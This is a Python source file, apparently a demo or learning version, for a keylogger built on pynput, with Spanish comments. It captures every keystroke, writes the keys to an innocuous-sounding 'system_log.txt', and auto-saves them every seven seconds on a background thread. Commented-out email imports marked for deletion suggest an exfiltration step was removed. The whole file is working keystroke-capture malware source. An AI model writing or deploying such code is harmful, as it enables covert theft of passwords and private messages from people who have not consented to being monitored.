import os
import time
# ELIMINAR estas líneas:
# import smtplib
# from email.mime.text import MimeText
from pynput import keyboard
from datetime import datetime
import threading

class Keylogger:
    def __init__(self):
        self.log_file = "system_log.txt"
        self.buffer = ""
        self.buffer_size = 20
        self.is_running = True
        print("✅ Keylogger INICIALIZADO correctamente")
        
    def on_press(self, key):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            if hasattr(key, 'char') and key.char is not None:
                key_data = key.char
            else:
                special_keys = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.backspace: '[BACKSPACE]'
                }
                key_data = special_keys.get(key, f"[{key.name.upper()}]")
            
            self.buffer += key_data
            print(f"✅ Tecla capturada: {key_data}")
            
            if len(self.buffer) >= self.buffer_size:
                self.save_buffer()
                
        except Exception as e:
            print(f"❌ Error: {e}")
    
    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
    
    def save_buffer(self):
        if self.buffer:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(self.buffer)
            print(f"✅ Buffer guardado: {self.buffer}")
            self.buffer = ""
    
    def stop(self):
        self.is_running = False
        self.save_buffer()
        print("\n🛑 Keylogger detenido")
    
    def start(self):
        print("🚀 Keylogger INICIADO...")
        print("📍 Presiona ESC para detener")
        print("📍 Las teclas se guardan en: system_log.txt")
        
        def auto_save():
            counter = 0
            while self.is_running:
                time.sleep(7)
                counter += 1
                self.save_buffer()
                print(f"⏰ Guardado automático #{counter} (cada 7 segundos)")
        
        save_thread = threading.Thread(target=auto_save)
        save_thread.daemon = True
        save_thread.start()
        
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    logger = Keylogger()
    try:
        logger.start()
    except KeyboardInterrupt:
        logger.stop()
